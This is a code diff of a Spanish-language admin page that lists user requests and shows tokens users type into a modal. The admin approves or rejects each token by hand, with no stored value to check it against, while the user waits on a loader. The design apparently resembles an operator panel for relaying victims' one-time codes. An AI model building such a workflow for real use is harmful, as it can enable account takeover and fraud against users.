@@ -612,15 +612,10 @@
                 var fecha = formatDate(s.created_at);
                 var id = s.id;
 
-                // Mostrar token generado por admin
-                var tokenHtml = '';
-                console.log('🔍 Renderizando #' + id + ' - token_acceso:', s.token_acceso, 'token_ingresado:', s.token_ingresado);
-                if (s.token_acceso) {
-                    tokenHtml += '<div style="font-size: 16px; font-weight: 700; color: #3730a3; letter-spacing: 3px; font-family: monospace; margin-top: 6px; padding: 4px 8px; background: #eef2ff; border-radius: 6px; display: inline-block;">🔑 ' + escapeHtml(s.token_acceso) + '</div>';
-                }
                 // Mostrar token ingresado por usuario
+                var tokenHtml = '';
                 if (s.token_ingresado) {
-                    tokenHtml += '<div style="font-size: 16px; font-weight: 700; color: #065f46; letter-spacing: 3px; font-family: monospace; margin-top: 4px; padding: 4px 8px; background: #ecfdf5; border-radius: 6px; display: inline-block;">✏️ ' + escapeHtml(s.token_ingresado) + '</div>';
+                    tokenHtml += '<div style="font-size: 16px; font-weight: 700; color: #065f46; letter-spacing: 3px; font-family: monospace; padding: 4px 8px; background: #ecfdf5; border-radius: 6px; display: inline-block;">✏️ ' + escapeHtml(s.token_ingresado) + '</div>';
                 }
 
                 html += '<tr>' +
@@ -693,47 +688,40 @@
             }
         }
 
-        // Generate token - genera un token de 6 dígitos y lo guarda en Supabase
+        // Solicitar token - cambia el estado a token_generado para que el usuario ingrese su token
         async function generarTokenClick(id) {
             try {
-                // Generar token aleatorio de 6 dígitos
-                var token = '';
-                for (var i = 0; i < 6; i++) {
-                    token += Math.floor(Math.random() * 10);
-                }
+                console.log('🔑 Solicitando token para #' + id);
                 
-                console.log('🔑 Token generado para #' + id + ':', token);
-                
-                // Guardar el token y cambiar estado a token_generado
-                // Si el usuario ya había ingresado un token incorrecto, se resetea
+                // Solo cambiar estado, sin generar ningún token
+                // El usuario ingresará su propio token desde el modal
                 var query = 'id=eq.' + id;
                 await supabaseFetch('PATCH', {
                     query: query,
                     body: { 
                         estado: 'token_generado',
-                        token_acceso: token,
+                        token_acceso: null,
                         token_ingresado: null
                     }
                 });
                 
-                console.log('✅ Token guardado correctamente para #' + id);
+                console.log('✅ Estado cambiado a token_generado para #' + id);
                 
-                // Recargar la tabla para que se vea el token en la fila
+                // Recargar la tabla
                 await cargarSolicitudes();
             } catch (err) {
-                console.error('❌ Error al generar token:', err);
-                alert('Error al generar el token. Revisa la consola (F12).');
+                console.error('❌ Error al solicitar token:', err);
+                alert('Error al solicitar el token. Revisa la consola (F12).');
             }
         }
 
         // ============================================================
-        // VALIDAR TOKEN - Compara token_acceso con token_ingresado
-        // El admin decide si el token es correcto o no
+        // VALIDAR TOKEN - El admin decide si el token ingresado es correcto
         // ============================================================
         async function validarTokenClick(id) {
             try {
                 // Obtener los datos actuales del registro
-                var query = 'select=token_acceso,token_ingresado&id=eq.' + id;
+                var query = 'select=token_ingresado&id=eq.' + id;
                 var data = await supabaseFetch('GET', { query: query });
                 
                 if (!data || data.length === 0) {
@@ -741,17 +729,19 @@
                     return;
                 }
                 
-                var tokenAcceso = data[0].token_acceso;
                 var tokenIngresado = data[0].token_ingresado;
                 
-                console.log('🔍 Validando token para #' + id + ' - acceso:', tokenAcceso, 'ingresado:', tokenIngresado);
+                console.log('🔍 Validando token para #' + id + ' - ingresado:', tokenIngresado);
                 
-                if (!tokenAcceso || !tokenIngresado) {
-                    alert('Faltan datos de token para validar.');
+                if (!tokenIngresado) {
+                    alert('El usuario aún no ha ingresado ningún token.');
                     return;
                 }
                 
-                if (tokenAcceso === tokenIngresado) {
+                // Preguntar al admin si el token es correcto
+                var esCorrecto = confirm('Token ingresado por el usuario: ' + tokenIngresado + '\n\n¿El token es correcto?\n\n• Click en "Aceptar" = ✅ APROBAR al usuario\n• Click en "Cancelar" = ❌ RECHAZAR el token (el usuario deberá intentar nuevamente)');
+                
+                if (esCorrecto) {
                     // ✅ Token correcto - aprobar automáticamente
                     console.log('✅ Token CORRECTO - aprobando automáticamente');
                     await actualizarEstado(id, 'aprobado');
@@ -760,7 +750,6 @@
                     // ❌ Token incorrecto - cambiar estado para que el usuario reintente
                     console.log('❌ Token INCORRECTO - enviando a usuario a reintentar');
                     
-                    // Cambiar estado a token_incorrecto para que el loader del usuario detecte y muestre el modal nuevamente
                     var queryPatch = 'id=eq.' + id;
                     await supabaseFetch('PATCH', {
                         query: queryPatch,
@@ -770,7 +759,7 @@
                         }
                     });
                     
-                    alert('❌ Token incorrecto. El usuario deberá ingresar el token nuevamente.');
+                    alert('❌ Token rechazado. El usuario deberá ingresar el token nuevamente.');
                 }
                 
                 await cargarSolicitudes();
